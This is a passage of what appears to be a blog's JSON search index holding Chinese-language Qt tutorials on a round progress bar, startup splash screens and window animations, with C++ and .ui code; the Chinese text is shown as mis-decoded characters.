pen.setWidth(8); pen.setCapStyle(Qt::RoundCap); p.setPen(pen); p.drawArc(innerRect, m_startAngel*16 , -16*arcLength); &#125; else &#123; //è·å–ä¸­å¿ƒç‚¹åæ ‡ QPointF centerPoint = baseRect.center(); QPainterPath dataPath; dataPath.setFillRule(Qt::WindingFill); dataPath.moveTo(centerPoint); //é€†æ—¶é’ˆç”»å¼§é•¿ dataPath.arcTo(baseRect, m_startAngel, -arcLength); if (m_barStyle == StylePie) &#123; dataPath.lineTo(centerPoint); p.setPen(QPen(QColor(&quot;#2F8DED&quot;), m_dataPenWidth)); &#125; p.setBrush(QBrush(QColor(&quot;#2F8DED&quot;))); p.drawPath(dataPath); &#125; &#125; void QRoundProgressBar::drawText(QPainter &amp;p, const QRectF &amp;rect, double value)&#123; QString textToDraw = &quot;%&quot;; double percent = (value - m_min) / (m_max - m_min) * 100.0; textToDraw = QString::number(percent, &#x27;f&#x27;, m_decimals) + textToDraw; QFont f; f.setFamily(&quot;å¾®è½¯é›…é»‘&quot;); f.setPixelSize(20); p.setFont(f); p.setPen(QColor(&quot;#606266&quot;)); p.drawText(rect, Qt::AlignCenter, textToDraw);&#125;","tags":[{"name":"Qt","slug":"Qt","permalink":"https://hodlyounger.github.io/tags/Qt/"},{"name":"è¿›åº¦æ¡","slug":"è¿›åº¦æ¡","permalink":"https://hodlyounger.github.io/tags/%E8%BF%9B%E5%BA%A6%E6%9D%A1/"},{"name":"åœ†","slug":"åœ†","permalink":"https://hodlyounger.github.io/tags/%E5%9C%86/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"åŠ¨ç”»","slug":"B-Code/Qt/åŠ¨ç”»","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"}]},{"title":"ã€Qtã€‘å¯åŠ¨åŠ¨ç”»","date":"2023-10-27T01:24:02.326Z","path":"B_Code/Qt/åŠ¨ç”»/ã€Qtã€‘å¯åŠ¨åŠ¨ç”»/","text":"[toc] QSplashScreen è®¾ç½®å›¾ç‰‡ Qtå†…ç½®äº†ç”¨äºç¨‹åºå¯åŠ¨çš„åŠ¨ç”»ç›´æ¥ä½¿ç”¨QSplashScreenå³å¯ã€‚ 12345678910111213141516171819202122QPixmap pixmap(&quot;:load.gif&quot;); //è¯»å–å›¾ç‰‡QSplashScreen splash(pixmap); //splash.setWindowOpacity(0.8); // è®¾ç½®çª—å£é€æ˜åº¦splash.show();splash.showMessage(&quot;ç¨‹åºæ­£åœ¨åŠ è½½......&quot;, Qt::AlignCenter, Qt::red); //æ˜¾ç¤ºæ–‡å­—// å¯é€‰é¡¹#ifdeg DEBUGQDateTime time = QDateTime::currentDateTime();QDateTime currentTime = QDateTime::currentDateTime(); //è®°å½•å½“å‰æ—¶é—´while (time.secsTo(currentTime) &lt;= 5) // 5ä¸ºéœ€è¦å»¶æ—¶çš„ç§’æ•°&#123; currentTime = QDateTime::currentDateTime(); a.processEvents();&#125;;#endifwidget w;w.show();splash.finish(&amp;w); //åœ¨ä¸»ä½“å¯¹è±¡åˆå§‹åŒ–å®Œæˆåç»“æŸå¯åŠ¨åŠ¨ç”» ä»¥ä¸Šä»£ç æ”¾åœ¨ç¨‹åºçš„å…¥å£mainå‡½æ•°ä¸­å³å¯ã€‚ widgetå°±æ˜¯æˆ‘ä»¬éœ€è¦å¯åŠ¨çš„ç¨‹åºã€‚ è‡ªå®šä¹‰å¯åŠ¨åŠ¨ç”» è‡ªå®šä¹‰å¯åŠ¨åŠ¨ç”»çš„æ–¹å¼ç½‘ä¸Šæœ‰å‡ ç§é‡å†™ QSplashScreen çš„ã€‚ç¬”è€…ä¹Ÿå°è¯•ä½¿ç”¨äº†ä¸€ä¸‹ï¼Œå‘ç°å¹¶ä¸å¥½ç”¨ï¼Œäºæ˜¯æŒ‰ç…§ä¸€å¼€å§‹çš„æ–¹æ¡ˆï¼Œå‡†å¤‡ç”¨ä¸€ä¸ª widget å»å†™å¯åŠ¨åŠ¨ç”»ã€‚ å‚è€ƒ QSplashScreen çš„æ–¹å¼ï¼Œè¿˜æ˜¯ä½¿ç”¨ finish(QWidget *mainWin) çš„æ¥å£å»ä½œä¸ºçª—ä½“å…³é—­çš„å…¥å£ã€‚ finish(Qwidget *mainWin) å…³äº finished(QWidget *mainWin) ç›´æ¥æŠŠ QSplashScreen çš„æºç æ¬è¿‡æ¥å³å¯ã€‚ æºç ä¸€èˆ¬åœ¨ä½ ä½¿ç”¨çš„ç‰ˆæœ¬çš„ src æ–‡ä»¶å¤¹ä¸‹ï¼š $&#123;install dir&#125;\\5.9.9\\Src\\qtbase\\src\\widgets\\widgets QSplashScreen æºç ä¸­çš„ finish() å¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011121314/*! Makes the splash screen wait until the widget \\a mainWin is displayed before calling close() on itself.*/// è¿™ä¸ªæ¥å£æˆ‘ä»¬éœ€è¦å¤åˆ¶åˆ°è‡ªå®šä¹‰çš„å¯åŠ¨åŠ¨ç”»çª—ä½“ä¸­ã€‚void QSplashScreen::finish(QWidget *mainWin)&#123; if (mainWin) &#123; if (!mainWin-&gt;windowHandle()) mainWin-&gt;createWinId(); waitForWindowExposed(mainWin-&gt;windowHandle()); &#125; close();&#125; ä¸Šè¿°ä»£ç ï¼Œå”¯ä¸€çš„é—®é¢˜åœ¨äº waitForWindowExposed è¿™ä¸ªå‡½æ•°æˆ‘æ²¡æœ‰æ‰¾åˆ°å®ç°ï¼Œä¹Ÿæ²¡æœ‰ä»”ç»†æ‰¾ï¼Œä½†æ˜¯åœ¨ Qt çš„ testlib åº“ä¸­æœ‰ä¸€ä¸ªç±»ä¼¼çš„æ¥å£ QTest::qwaitForWindowExposed() ä¸¤ä¸ªæ¥å£çš„ä½œç”¨åº”è¯¥æ˜¯ä¸€è‡´çš„ã€‚ä¸Šè¿°ä»£ç ä¸­ waitForWindowExposed(mainWin-&gt;windowHandle()); ç»ç¬”è€…æµ‹è¯•å“ˆï¼ˆä¸ä¸€å®šå‡†ç¡®ï¼‰ï¼Œå³ä½¿å»æ‰ä¹Ÿä¸ä¼šå½±å“ finish() æ¥å£çš„ä½œç”¨ã€‚2022å¹´7æœˆ27æ—¥08:39:40 å»æ‰è¿˜æ˜¯ä¼šæœ‰å½±å“çš„ï¼Œç›¸å½“äºåˆ¤æ–­çª—å£çš„é€»è¾‘æ²¡äº†ã€‚å…³äº waitForWindowExposed() åœ¨ Qtæºç ä¸­çš„å®ç°ï¼Œç¬”è€…åœ¨è°ƒè¯•ç¨‹åºçš„æ—¶å€™å‘ç°å»æ‰è¿™è¡Œä»£ç ï¼Œæ€ä¹ˆçœ‹å¯åŠ¨åŠ¨ç”»å’Œè¿è¡Œçš„ç¨‹åºä¹‹é—´çš„è¡”æ¥éƒ½ä¸å¤ªåˆç†ï¼Œé‚å†³å®šæ‰¾ä¸€ä¸‹è¿™ä¸ª waitForWindowExposed() çš„æºç ï¼Œè¿™ä¸€æ‰¾ï¼ŒçœŸçš„æ˜¯è¿œåœ¨å¤©è¾¹ï¼Œè¿‘åœ¨çœ¼å‰ã€‚å‡½æ•°çš„å®ç°å°±åœ¨ qsplashscreen.cpp ä¸­ã€‚è¿™é‡Œè´´ä¸€ä¸‹å…¶æºç ã€‚ 1234567891011121314151617181920212223// A copy of Qt Test&#x27;s qWaitForWindowExposed() and qSleep().inline static bool waitForWindowExposed(QWindow *window, int timeout = 1000)&#123; enum &#123; TimeOutMs = 10 &#125;; QElapsedTimer timer; timer.start(); while (!window-&gt;isExposed()) &#123; const int remaining = timeout - int(timer.elapsed()); if (remaining &lt;= 0) break; QCoreApplication::processEvents(QEventLoop::AllEvents, remaining); QCoreApplication::sendPostedEvents(0, QEvent::DeferredDelete);#if defined(Q_OS_WINRT) WaitForSingleObjectEx(GetCurrentThread(), TimeOutMs, false);#elif defined(Q_OS_WIN) Sleep(uint(TimeOutMs));#else struct timespec ts = &#123; TimeOutMs / 1000, (TimeOutMs % 1000) * 1000 * 1000 &#125;; nanosleep(&amp;ts, NULL);#endif &#125; return window-&gt;isExposed();&#125; å¦‚æœè¦ä½¿ç”¨ä½ æºç ä¸­çš„å®ç°ï¼Œåˆ™éœ€è¦å¼•å…¥ä¸¤ä¸ªå¤´é—®é¢˜ã€‚ 12#include &lt;QElapsedTimer&gt;#include &lt;QtGui/QWindow&gt; *è®¾ç½®çª—ä½“ è®¾ç½®çª—ä½“çš„é€»è¾‘ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯åˆ›å»ºä¸€ä¸ªwidgetã€Dialogä¸“é—¨ç”¨æ¥å®ç°å¯åŠ¨åŠ¨ç”»çš„é€»è¾‘ã€‚å¦‚ä¸‹æ‰€ç¤ºä¸ºQtç¨‹åºçš„å…¥å£å‡½æ•°ï¼š 123456789101112int main(int argc, char *argv[])&#123; QApplication a(argc, argv); Dialog d; // å¯åŠ¨åŠ¨ç”»çš„çª—å° d.show(); Widget w; w.show(); d.finish(&amp;w); // å¤åˆ¶çš„ QSplashScreen ä¸­çš„ finished() return a.exec();&#125; å…¶ä¸­çš„ Dialog d å°±æ˜¯æˆ‘ä»¬åˆ›å»ºçš„ä¸€ä¸ªè‡ªå®šä¹‰çš„å¯åŠ¨åŠ¨ç”»çª—å£ï¼Œè‡³äºçª—å£å†…è¦å®ç°ä»€ä¹ˆï¼Œä¾æ®ä½ ä¸ªäººçš„ä¸šåŠ¡å’Œéœ€æ±‚å»å®ç°å³å¯ã€‚ é—®é¢˜1 ä¸Šæ–‡ä¸­çš„ Dialog è¿˜æ²¡æœ‰ä¸»ç•Œé¢å°±å±•ç¤ºäº†ï¼Œæˆ–è€… Dialog å±•ç¤ºäº†ä½†æ˜¯æ²¡æœ‰ç”»é¢ã€‚ å…³äºè¿™ä¸ªé—®é¢˜ï¼Œæˆ‘è®¤ä¸ºæ˜¯ä¸»ç•Œé¢çš„åˆ·æ–°å¤ªå¿«äº†ï¼ˆå¤§å®¶å¯ä»¥è°ƒè¯•ä»£ç å»è§‚å¯Ÿä¸€ä¸‹ç°è±¡ï¼‰ï¼Œä¹Ÿå°±æ˜¯ finish ç›¸å½“äºæ˜¯ç¬é—´è°ƒç”¨äº†ã€‚å¯¼è‡´ Dialogæ²¡æœ‰å±•ç¤ºå’Œæ¥å¾—åŠåˆ·æ–° ã€‚è¿™ä¸ªé—®é¢˜ç½‘å‹ä¹Ÿç»™å‡ºäº†æ–¹æ¡ˆï¼Œè®© main åšä¸€äº›åˆ«çš„æ“ä½œå»¶æ—¶ä¸€ä¸‹ã€‚ç›®å‰ç¬”è€…ç”¨è¿‡çš„æœ€å¥½çš„ä¸æ˜¯åœ¨ main ä¸­ sleep ã€‚è€Œæ˜¯æ‰§è¡Œä»¥ä¸‹ processEvent() å…·ä½“çš„ä»£ç å°±æ˜¯åœ¨ Widget::show() ä¹‹å‰è°ƒç”¨ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 12345678// è¿™é‡Œçš„æ—¶é—´åªæ˜¯ä¸ºäº†åšä¸€ä¸ªåˆ¤æ–­ï¼Œåªè°ƒç”¨ä¸€ä¸‹ a.processEvents(); åº”è¯¥ä¹Ÿæ˜¯å¯ä»¥çš„QDateTime time = QDateTime::currentDateTime();QDateTime currentTime = QDateTime::currentDateTime(); //è®°å½•å½“å‰æ—¶é—´while (time.secsTo(currentTime) &lt;= 5) //5ä¸ºéœ€è¦å»¶æ—¶çš„ç§’æ•°&#123; currentTime = QDateTime::currentDateTime(); a.processEvents();&#125;; é—®é¢˜2 Dialog ç»“æŸçš„æ—¶å€™ç•Œé¢å…³é—­å’Œä¸»ç•Œé¢çš„å±•ç¤ºä¼šä¸­æ–­ä¸€ä¸‹ï¼Œå¼ºè¿«ç—‡éš¾ä»¥æ¥å—è¿™ç§çªç„¶é—ªç°æ€ä¹ˆåŠï¼Ÿ è¿˜æ˜¯ä¼šåˆ° finish() ã€‚ åœ¨ closed() çš„ä½ç½® sleep()ï¼Œè®©å…³é—­çš„çª—å£ç¨å¾®ç­‰ä¸€ç­‰ï¼Œç­‰ä¸»ç•Œé¢å±•ç¤ºå‡ºæ¥ä¹‹åå†å…³é—­ã€‚1s çš„æ—¶é—´è¶³å¤Ÿä¸»ç•Œé¢åˆ·æ–°å‡ºæ¥äº† ã€‚ä»£ç å¦‚ä¸‹ï¼š 12345678910void Dialog::finish(QWidget *mainWin) // è¿™é‡Œå·²ç»æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„å¯åŠ¨åŠ¨ç”»çª—å£ Dialog äº†&#123; if (mainWin) &#123; if (!mainWin-&gt;windowHandle()) mainWin-&gt;createWinId(); waitForWindowExposed(mainWin-&gt;windowHandle()); &#125; QThread::sleep(1); // sleep çš„å•ä½æ˜¯ç§’ close();&#125; å®Œæ•´ä»£ç  widget çš„ä»£ç ä¸å±•ç¤º main.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &quot;widget.h&quot;#include &quot;dialog.h&quot;#include &lt;QApplication&gt;#include &lt;QLabel&gt;#include &lt;QPixmap&gt;#include &lt;QSplashScreen&gt;#include &lt;QThread&gt;int main(int argc, char *argv[])&#123; QApplication a(argc, argv);#ifdef QT_DEBUG // ä½¿ç”¨ QSplashScreen çš„å¯åŠ¨åŠ¨ç”» QPixmap pixmap(&quot;:/test.gif&quot;); QSplashScreen splash(pixmap,10); splash.show(); QDateTime time = QDateTime::currentDateTime(); QDateTime currentTime = QDateTime::currentDateTime(); //è®°å½•å½“å‰æ—¶é—´ while (time.secsTo(currentTime) &lt;= 5) //5ä¸ºéœ€è¦å»¶æ—¶çš„ç§’æ•° &#123; currentTime = QDateTime::currentDateTime(); a.processEvents(); &#125;;#endif Dialog d; // ä½¿ç”¨è‡ªå®šä¹‰çš„å¯åŠ¨åŠ¨ç”» d.show(); QDateTime time = QDateTime::currentDateTime(); QDateTime currentTime = QDateTime::currentDateTime(); //è®°å½•å½“å‰æ—¶é—´ while (time.secsTo(currentTime) &lt;= 5) //5ä¸ºéœ€è¦å»¶æ—¶çš„ç§’æ•° &#123; currentTime = QDateTime::currentDateTime(); a.processEvents(); &#125;; Widget w; // ä¸»ç¨‹åº w.show();#ifdef QT_DEBUG // ä½¿ç”¨ QSplashScreen çš„å¯åŠ¨åŠ¨ç”» splash.finish(&amp;w);#endif d.finish(&amp;w); return a.exec();&#125; dialog.h 1234567891011121314151617181920212223#ifndef DIALOG_H#define DIALOG_H#include &lt;QDialog&gt;namespace Ui &#123;class Dialog;&#125;class Dialog : public QDialog&#123; Q_OBJECTpublic: explicit Dialog(QWidget *parent = nullptr); ~Dialog(); void finish(QWidget *mainWin);private: Ui::Dialog *ui;&#125;;#endif // DIALOG_H dialog.cpp 12345678910111213141516171819202122232425262728293031#include &quot;dialog.h&quot;#include &quot;ui_dialog.h&quot;Dialog::Dialog(QWidget *parent) : QDialog(parent), ui(new Ui::Dialog)&#123; ui-&gt;setupUi(this); // setWindowFlags(Qt::FramelessWindowHint | Qt::Tool | Qt::WindowStaysOnTopHint | Qt::Window); //setAttribute(Qt::WA_TranslucentBackground); setStyleSheet(&quot;#Dialog&#123;&quot; &quot;border-image: url(:/bgimg_334.png);&quot; // è‡ªå·±æ·»åŠ ä¸€ä¸ªå›¾ç‰‡åˆ°ç¨‹åºï¼Œä¸æ·»åŠ ä¹Ÿä¸å½±å“ç¨‹åºè¿è¡Œ &quot;background-position: center;&quot; &quot;backgroun d-repeat: no-repeat;&quot; &quot;&#125;&quot;);&#125;Dialog::~Dialog()&#123; delete ui;&#125;void Dialog::finish(QWidget* mainWin)&#123; if (mainWin) &#123; if (!mainWin-&gt;windowHandle()) mainWin-&gt;createWinId(); // QTest::qWaitForWindowExposed(mainWin-&gt;windowHandle()); &#125; close();&#125; dialog.ui 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;ui version=&quot;4.0&quot;&gt; &lt;class&gt;Dialog&lt;/class&gt; &lt;widget class=&quot;QDialog&quot; name=&quot;Dialog&quot;&gt; &lt;property name=&quot;geometry&quot;&gt; &lt;rect&gt; &lt;x&gt;0&lt;/x&gt; &lt;y&gt;0&lt;/y&gt; &lt;width&gt;400&lt;/width&gt; &lt;height&gt;300&lt;/height&gt; &lt;/rect&gt; &lt;/property&gt; &lt;property name=&quot;windowTitle&quot;&gt; &lt;string&gt;Dialog&lt;/string&gt; &lt;/property&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout&quot;&gt; &lt;item row=&quot;2&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QDialogButtonBox&quot; name=&quot;buttonBox&quot;&gt; &lt;property name=&quot;orientation&quot;&gt; &lt;enum&gt;Qt::Horizontal&lt;/enum&gt; &lt;/property&gt; &lt;property name=&quot;standardButtons&quot;&gt; &lt;set&gt;QDialogButtonBox::Cancel|QDialogButtonBox::Ok&lt;/set&gt; &lt;/property&gt; &lt;/widget&gt; &lt;/item&gt; &lt;item row=&quot;1&quot; column=&quot;0&quot;&gt; &lt;widget class=&quot;QFrame&quot; name=&quot;frame&quot;&gt; &lt;property name=&quot;frameShape&quot;&gt; &lt;enum&gt;QFrame::StyledPanel&lt;/enum&gt; &lt;/property&gt; &lt;property name=&quot;frameShadow&quot;&gt; &lt;enum&gt;QFrame::Raised&lt;/enum&gt; &lt;/property&gt; &lt;layout class=&quot;QGridLayout&quot; name=&quot;gridLayout_2&quot;&gt; &lt;item row=&quot;0&quot; column=&quot;0&quot;&gt; &lt;layout class=&quot;QVBoxLayout&quot; name=&quot;verticalLayout&quot;&gt; &lt;item&gt; &lt;widget class=&quot;QStackedWidget&quot; name=&quot;stackedWidget&quot;&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page&quot;&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;widget&quot; native=&quot;true&quot;&gt; &lt;property name=&quot;geometry&quot;&gt; &lt;rect&gt; &lt;x&gt;-101&lt;/x&gt; &lt;y&gt;-10&lt;/y&gt; &lt;width&gt;231&lt;/width&gt; &lt;height&gt;51&lt;/height&gt; &lt;/rect&gt; &lt;/property&gt; &lt;/widget&gt; &lt;/widget&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page_2&quot;/&gt; &lt;/widget&gt; &lt;/item&gt; &lt;item&gt; &lt;widget class=&quot;QStackedWidget&quot; name=&quot;stackedWidget_2&quot;&gt; &lt;property name=&quot;currentIndex&quot;&gt; &lt;number&gt;1&lt;/number&gt; &lt;/property&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page_3&quot;/&gt; &lt;widget class=&quot;QWidget&quot; name=&quot;page_4&quot;/&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;/item&gt; &lt;/layout&gt; &lt;/widget&gt; &lt;resources/&gt; &lt;connections&gt; &lt;connection&gt; &lt;sender&gt;buttonBox&lt;/sender&gt; &lt;signal&gt;accepted()&lt;/signal&gt; &lt;receiver&gt;Dialog&lt;/receiver&gt; &lt;slot&gt;accept()&lt;/slot&gt; &lt;hints&gt; &lt;hint type=&quot;sourcelabel&quot;&gt; &lt;x&gt;248&lt;/x&gt; &lt;y&gt;254&lt;/y&gt; &lt;/hint&gt; &lt;hint type=&quot;destinationlabel&quot;&gt; &lt;x&gt;157&lt;/x&gt; &lt;y&gt;274&lt;/y&gt; &lt;/hint&gt; &lt;/hints&gt; &lt;/connection&gt; &lt;connection&gt; &lt;sender&gt;buttonBox&lt;/sender&gt; &lt;signal&gt;rejected()&lt;/signal&gt; &lt;receiver&gt;Dialog&lt;/receiver&gt; &lt;slot&gt;reject()&lt;/slot&gt; &lt;hints&gt; &lt;hint type=&quot;sourcelabel&quot;&gt; &lt;x&gt;316&lt;/x&gt; &lt;y&gt;260&lt;/y&gt; &lt;/hint&gt; &lt;hint type=&quot;destinationlabel&quot;&gt; &lt;x&gt;286&lt;/x&gt; &lt;y&gt;274&lt;/y&gt; &lt;/hint&gt; &lt;/hints&gt; &lt;/connection&gt; &lt;/connections&gt;&lt;/ui&gt;","tags":[{"name":"Qt/åŠ¨ç”»","slug":"Qt-åŠ¨ç”»","permalink":"https://hodlyounger.github.io/tags/Qt-%E5%8A%A8%E7%94%BB/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"åŠ¨ç”»","slug":"B-Code/Qt/åŠ¨ç”»","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"}]},{"title":"ã€Qtã€‘åŠ¨ç”»æ•ˆæœ ï¼ˆæŠ–åŠ¨ã€ä¸‹å ã€é€æ˜åº¦ï¼‰","date":"2023-10-27T01:24:02.325Z","path":"B_Code/Qt/åŠ¨ç”»/ã€Qtã€‘åŠ¨ç”»/","text":"æ”¶é›†æ•´ç†çš„ä¸€äº› Qt å¸¸ç”¨åŠ¨ç”» [toc] ä¸‹å æ•ˆæœ é€šè¿‡è®¡ç®—æ¡Œé¢çš„å®½åº¦ã€é«˜åº¦ï¼Œæ¥è®¾ç½®åŠ¨ç”»çš„èµ·å§‹å€¼å’Œç»“æŸå€¼ã€‚ 123456789101112void MainWindow::onDropWindow()&#123; QPropertyAnimation *pAnimation = new QPropertyAnimation(this, &quot;geometry&quot;); QDesktopWidget *pDesktopWidget = QApplication::desktop(); int x = (pDesktopWidget-&gt;availableGeometry().width() - width()) / 2; int y = (pDesktopWidget-&gt;availableGeometry().height() - height()) / 2; pAnimation-&gt;setDuration(1000); pAnimation-&gt;setStartValue(QRect(x, 0, width(), height())); pAnimation-&gt;setEndValue(QRect(x, y, width(), height())); pAnimation-&gt;setEasingCurve(QEasingCurve::OutElastic); pAnimation-&gt;start(QAbstractAnimation::DeleteWhenStopped);&#125; æŠ–åŠ¨æ•ˆæœ è·å–ç•Œé¢çš„åæ ‡ï¼Œç„¶åè¿›è¡Œä¸Šã€ä¸‹ã€å·¦ã€å³åæ ‡æµ®åŠ¨ï¼Œé€šè¿‡setKeyValueAt()æ¥è®¾ç½®æ¯ä¸€æ—¶åˆ»çš„ä½ç½®ï¼Œå®ç°æŠ–åŠ¨æ•ˆæœã€‚ 123456789101112131415161718void MainWindow::onShakeWindow()&#123; QPropertyAnimation *pAnimation = new QPropertyAnimation(this, &quot;pos&quot;); pAnimation-&gt;setDuration(500); pAnimation-&gt;setLoopCount(2); pAnimation-&gt;setKeyValueAt(0, QPoint(geometry().x() - 3, geometry().y() - 3)); pAnimation-&gt;setKeyValueAt(0.1, QPoint(geometry().x() + 6, geometry().y() + 6)); pAnimation-&gt;setKeyValueAt(0.2, QPoint(geometry().x() - 6, geometry().y() + 6)); pAnimation-&gt;setKeyValueAt(0.3, QPoint(geometry().x() + 6, geometry().y() - 6)); pAnimation-&gt;setKeyValueAt(0.4, QPoint(geometry().x() - 6, geometry().y() - 6)); pAnimation-&gt;setKeyValueAt(0.5, QPoint(geometry().x() + 6, geometry().y() + 6)); pAnimation-&gt;setKeyValueAt(0.6, QPoint(geometry().x() - 6, geometry().y() + 6)); pAnimation-&gt;setKeyValueAt(0.7, QPoint(geometry().x() + 6, geometry().y() - 6)); pAnimation-&gt;setKeyValueAt(0.8, QPoint(geometry().x() - 6, geometry().y() - 6)); pAnimation-&gt;setKeyValueAt(0.9, QPoint(geometry().x() + 6, geometry().y() + 6)); pAnimation-&gt;setKeyValueAt(1, QPoint(geometry().x() - 3, geometry().y() - 3)); pAnimation-&gt;start(QAbstractAnimation::DeleteWhenStopped);&#125; é€æ˜åº¦æ•ˆæœ è®¾ç½®æ¯ä¸€æ—¶åˆ»çš„é€æ˜åº¦å€¼ï¼ŒåŠ¨ç”»ç»“æŸæ—¶ç•Œé¢è¿˜åŸï¼ˆé€æ˜åº¦å†ä¸º1ï¼‰ã€‚ 123456789void MainWindow::onOpacityWindow()&#123; QPropertyAnimation *pAnimation = new QPropertyAnimation(this, &quot;windowOpacity&quot;); pAnimation-&gt;setDuration(1000); pAnimation-&gt;setKeyValueAt(0, 1); pAnimation-&gt;setKeyValueAt(0.5, 0); pAnimation-&gt;setKeyValueAt(1, 1); pAnimation-&gt;start(QAbstractAnimation::DeleteWhenStopped);&#125; æ˜¯ä¸æ˜¯å¾ˆæœ‰è¶£ï¼Œè¿˜ä¸å¿«ç‚¹å„¿ï¼Œå®ç°å±äºè‡ªå·±çš„åŠ¨ç”»ã€‚","tags":[{"name":"Qt/åŠ¨ç”»","slug":"Qt-åŠ¨ç”»","permalink":"https://hodlyounger.github.io/tags/Qt-%E5%8A%A8%E7%94%BB/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/"},{"name":"åŠ¨ç”»","slug":"B-Code/Qt/åŠ¨ç”»","permalink":"https://hodlyounger.github.io/categories/B-Code/Qt/%E5%8A%A8%E7%94%BB/"}]},{"title":"ã€Qtã€‘åŠ¨ç”»ç±»","date":"2023-10-27T01:24:02.325Z","path":"B_Code/Qt/åŠ¨ç”»/ã€Qtã€‘åŠ¨ç”»æ•ˆæœ/","text":"[toc] åŠ¨ç”»æ¡†æ¶ç»“æ„ åŠ¨ç”»æ¡†æ¶ç”±åŸºç±» QAbstractAnimation ä»¥åŠå®ƒçš„ä¸¤ä¸ªå­ç±» QVariantAnimation ã€QAnimationGroup ç»„æˆã€‚åŸºç¡€åŠ¨ç”»ç”±QVariantAnimationçš„å­ç±»QPropertyAnimationæ¥è®¾ç½®ï¼Œå†é€šè¿‡å°†å¤šä¸ªQPropertyAnimationå’ŒQPauseAnimationç»„åˆæˆä¸ºåŠ¨ç”»ç»„ï¼ˆQParallelAnimationGroupã€QSequentialAnimationGroupï¼‰ï¼Œå®Œæˆä¸€ä¸ªè¿ç»­çš„åŠ¨ç”»ã€‚ QPropertyAnimation QPropertyAnimation ç±»èƒ½å¤Ÿä¿®æ”¹Qtçš„å±æ€§å€¼ï¼Œå¦‚posã€geometryç­‰å±æ€§ã€‚è®¾ç½®å¥½åŠ¨ç”»çš„åˆå€¼å’Œæœ«å€¼ï¼Œä»¥åŠæŒç»­çš„æ—¶é—´åï¼Œä¸€ä¸ªå±æ€§åŠ¨ç”»å°±åŸºæœ¬å®Œæˆäº†ã€‚ ç¼©æ”¾ é€šè¿‡ä¿®æ”¹æ§ä»¶çš„geometryå±æ€§å¯ä»¥å®ç°ç¼©æ”¾æ•ˆæœï¼Œä¹Ÿå¯ä»¥å®ç°ä½ç§»çš„åŠ¨ç”»ï¼Œè¯¥å±æ€§çš„å‰ä¸¤ä¸ªå€¼ç¡®å®šäº†æ§ä»¶å·¦ä¸Šè§’çš„ä½ç½®ï¼Œåä¸¤ä¸ªå€¼ç¡®å®šäº†æ§ä»¶çš„å¤§å°ã€‚ 12345//scaleQPropertyAnimation *pScaleAnimation1 = new QPropertyAnimation(ui-&gt;scaleButton, &quot;geometry&quot;);pScaleAnimation1-&gt;setDuration(1000);pScaleAnimation1-&gt;setStartValue(QRect(190, 230, 0, 0));pScaleAnimation1-&gt;setEndValue(QRect(120, 160, 140, 140)); ä½ç§» å¦‚æœåªæ˜¯éœ€è¦ä½ç§»åŠ¨ç”»çš„è¯ï¼Œä¿®æ”¹æ§ä»¶çš„poså±æ€§å³å¯ã€‚poså±æ€§å°±æ˜¯æ§ä»¶çš„å·¦ä¸Šè§’æ‰€åœ¨çš„ä½ç½®ã€‚ 123456//posQPropertyAnimation *pPosAnimation1 = new QPropertyAnimation(ui-&gt;posButton, &quot;pos&quot;);pPosAnimation1-&gt;setDuration(1000);pPosAnimation1-&gt;setStartValue(QPoint(360, 160));pPosAnimation1-&gt;setEndValue(QPoint(360, 350));pPosAnimation1-&gt;setEasingCurve(QEasingCurve::InOutQuad); ä¸é€æ˜åº¦ Qtçš„æ§ä»¶æ²¡æœ‰å•ç‹¬çš„é€æ˜åº¦å±æ€§ï¼Œè¦ä¿®æ”¹æ§ä»¶çš„é€æ˜åº¦å¯ä»¥é€šè¿‡ QGraphicsOpacityEffect ç±»æ¥å®ç°ã€‚ 123456789//opacityQGraphicsOpacityEffect *pButtonOpacity = new QGraphicsOpacityEffect(this);pButtonOpacity-&gt;setOpacity(1);ui-&gt;opasityButton-&gt;setGraphicsEffect(pButtonOpacity);QPropertyAnimation *pOpacityAnimation1 = new QPropertyAnimation(pButtonOpacity, &quot;opacity&quot;);pOpacityAnimation1-&gt;setDuration(1000);pOpacityAnimation1-&gt;setStartValue(1);pOpacityAnimation1-&gt;setEndValue(0); åŠ¨ç”»æ›²çº¿ åŠ¨ç”»è¿˜å¯ä»¥è®¾ç½®æ—¶é—´çš„æ’å€¼æ›²çº¿ï¼Œé»˜è®¤æ˜¯linearï¼Œå³çº¿æ€§è¿åŠ¨ï¼Œé€šè¿‡è®¾ç½®QEasingCurveå³å¯ã€‚Qtæä¾›äº†40ç§å·²ç»å®šä¹‰å¥½çš„æ›²çº¿ï¼ˆå¦‚æœæœ‰éœ€è¦ä¹Ÿå¯ä»¥è‡ªå®šä¹‰æ›²çº¿ï¼‰ï¼š 